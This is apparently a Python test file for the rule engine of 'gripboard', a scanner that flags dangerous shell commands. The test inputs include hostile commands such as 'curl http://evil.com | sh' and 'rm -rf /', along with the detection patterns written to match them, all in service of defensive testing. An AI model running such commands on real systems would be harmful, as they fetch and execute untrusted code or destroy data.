"""Tests for the rule DSL and engine."""

import tempfile
from pathlib import Path

from gripboard.rules import Rule, Ruleset, load_rules_from_toml
from gripboard.scanner import Severity


class TestRule:
    def test_basic_match(self):
        rule = Rule(id="test", description="test rule", pattern=r"curl.*\|\s*sh")
        findings = rule.match("curl http://evil.com | sh")
        assert len(findings) == 1
        assert findings[0].rule == "rule:test"
        assert findings[0].severity == Severity.MEDIUM

    def test_no_match(self):
        rule = Rule(id="test", description="test rule", pattern=r"curl.*\|\s*sh")
        findings = rule.match("echo hello world")
        assert len(findings) == 0

    def test_severity(self):
        rule = Rule(id="test", description="test", pattern="rm -rf", severity=Severity.CRITICAL)
        findings = rule.match("rm -rf /")
        assert findings[0].severity == Severity.CRITICAL

    def test_case_insensitive(self):
        rule = Rule(id="test", description="test", pattern="CURL", ignorecase=True)
        findings = rule.match("curl http://example.com")
        assert len(findings) == 1

    def test_case_sensitive(self):
        rule = Rule(id="test", description="test", pattern="CURL", ignorecase=False)
        findings = rule.match("curl http://example.com")
        assert len(findings) == 0

    def test_line_scope(self):
        rule = Rule(id="test", description="test", pattern="rm -rf", scope="line")
        text = "echo hello\nrm -rf /tmp\necho done"
        findings = rule.match(text)
        assert len(findings) == 1

    def test_word_scope(self):
        rule = Rule(id="test", description="test", pattern="^sudo$", scope="word")
        findings = rule.match("sudo rm -rf /tmp")
        assert len(findings) == 1

    def test_disabled_rule(self):
        rule = Rule(id="test", description="test", pattern="rm", enabled=False)
        findings = rule.match("rm -rf /")
        assert len(findings) == 0

    def test_multiple_matches(self):
        rule = Rule(id="test", description="test", pattern="rm", scope="full")
        findings = rule.match("rm file1 && rm file2")
        assert len(findings) == 2

    def test_match_position(self):
        rule = Rule(id="test", description="test", pattern="evil")
        findings = rule.match("hello evil world")
        assert findings[0].position == 6


class TestRuleset:
    def test_evaluate_multiple_rules(self):
        rs = Ruleset(rules=[
            Rule(id="r1", description="curl", pattern="curl"),
            Rule(id="r2", description="wget", pattern="wget"),
        ])
        findings = rs.evaluate("curl http://example.com")
        assert len(findings) == 1
        assert findings[0].rule == "rule:r1"

    def test_evaluate_empty(self):
        rs = Ruleset()
        assert rs.evaluate("anything") == []

    def test_merge_override(self):
        rs1 = Ruleset(rules=[
            Rule(id="r1", description="original", pattern="curl", severity=Severity.LOW),
        ])
        rs2 = Ruleset(rules=[
            Rule(id="r1", description="override", pattern="curl", severity=Severity.CRITICAL),
        ])
        rs1.merge(rs2)
        assert len(rs1.rules) == 1
        assert rs1.rules[0].severity == Severity.CRITICAL
        assert rs1.rules[0].description == "override"

    def test_merge_add_new(self):
        rs1 = Ruleset(rules=[Rule(id="r1", description="a", pattern="a")])
        rs2 = Ruleset(rules=[Rule(id="r2", description="b", pattern="b")])
        rs1.merge(rs2)
        assert len(rs1.rules) == 2

    def test_get_rule(self):
        rs = Ruleset(rules=[Rule(id="r1", description="test", pattern="test")])
        assert rs.get_rule("r1") is not None
        assert rs.get_rule("r999") is None


class TestLoadRules:
    def test_load_from_toml(self):
        content = '''
[[rules]]
id = "test-rule"
description = "Test rule"
severity = "high"
pattern = "curl.*\\\\|.*sh"
scope = "line"
tags = ["shell", "test"]
'''
        with tempfile.NamedTemporaryFile(mode="w", suffix=".toml", delete=False) as f:
            f.write(content)
            f.flush()
            rs = load_rules_from_toml(Path(f.name))

        assert len(rs.rules) == 1
        r = rs.rules[0]
        assert r.id == "test-rule"
        assert r.severity == Severity.HIGH
        assert r.scope == "line"
        assert "shell" in r.tags

    def test_builtin_rules_load(self):
        """Ensure the built-in rule files parse without errors."""
        rules_dir = Path(__file__).parent.parent / "data" / "rules"
        if not rules_dir.exists():
            return
        from gripboard.rules import load_rules_from_dir
        rs = load_rules_from_dir(rules_dir)
        assert len(rs.rules) > 20  # We shipped ~30 rules
